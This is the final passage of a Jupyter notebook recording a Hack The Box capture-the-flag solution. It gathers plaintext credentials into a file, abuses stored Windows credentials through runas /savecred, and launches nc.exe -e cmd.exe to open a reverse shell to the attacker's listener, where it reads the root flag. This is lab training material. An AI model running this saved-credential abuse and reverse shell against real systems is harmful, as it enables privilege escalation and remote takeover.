    "If the scripts begin from \"2_*.sql\" or \"3_*.sql\" it means the previous scripts ran fine, so begin from the lowest script number ascending.\n",
    "\n",
    "For the vbs scripts: \n",
    "- Go to windows Services and stop ALL SQL related services.\n",
    "- Open command prompt with elevated privileges (Administrator).\n",
    "- paste the following commands in command prompt for each script and click ENTER...\n",
    "\t1. cmd.exe /c WScript.exe \"c:\\temp\\scripts\\SQLOpenFirewallPorts.vbs\" \"C:\\Windows\\system32\" \"c:\\temp\\logs\\\"\n",
    "\t2. cmd.exe /c WScript.exe \"c:\\temp\\scripts\\SQLServerCfgPort.vbs\" \"C:\\Windows\\system32\" \"c:\\temp\\logs\\\" \"NO_INSTANCES_FOUND\"\n",
    "\t3. cmd.exe /c WScript.exe \"c:\\temp\\scripts\\SetAccessRuleOnDirectory.vbs\" \"C:\\Windows\\system32\" \"c:\\temp\\logs\\\" \"NT AUTHORITY\\SYSTEM\" \"C:\\\\Portal\\database\"\n",
    "\t4. Start up all SQL services again manually or run - cmd.exe /c WScript.exe \"c:\\temp\\scripts\\RestartServiceByDescriptionNameLike.vbs\" \"C:\\Windows\\system32\" \"c:\\temp\\logs\\\" \"SQL Server (NO_INSTANCES_FOUND)\" "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "engineer / access4u@security\r\n",
      "security / 4Cc3ssC0ntr0ller\r\n",
      "sa / htrcy@HXeryNJCTRHcnb45CJRY\r\n"
     ]
    }
   ],
   "source": [
    "!echo \"sa / htrcy@HXeryNJCTRHcnb45CJRY\" >> creds.txt\n",
    "!cat creds.txt"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "C:\\temp>cmdkey /list\n",
    "\n",
    "Currently stored credentials:\n",
    "\n",
    "    Target: Domain:interactive=ACCESS\\Administrator\n",
    "                                                       Type: Domain Password\n",
    "    User: ACCESS\\Administrator"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "root@kali:~/git/HackTheBox/access# nc -lvnp 80\n",
    "C:\\temp>runas /savecred /user:ACCESS\\Administrator \"c:\\windows\\system32\\cmd.exe /c c:\\temp\\nc.exe 10.10.14.17 80 -e cmd.exe\""
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "listening on [any] 80 ...\n",
    "connect to [10.10.14.17] from (UNKNOWN) [10.10.10.98] 49181\n",
    "Microsoft Windows [Version 6.1.7600]\n",
    "Copyright (c) 2009 Microsoft Corporation.  All rights reserved.\n",
    "\n",
    "C:\\Windows\\system32>cd ../../Users/Administrator/Desktop\n",
    "cd ../../Users/Administrator/Desktop\n",
    "\n",
    "C:\\Users\\Administrator\\Desktop>type root.txt\n",
    "type root.txt\n",
    "6e1586cc7ab230a8d297e8f933d904cf"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.2+"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
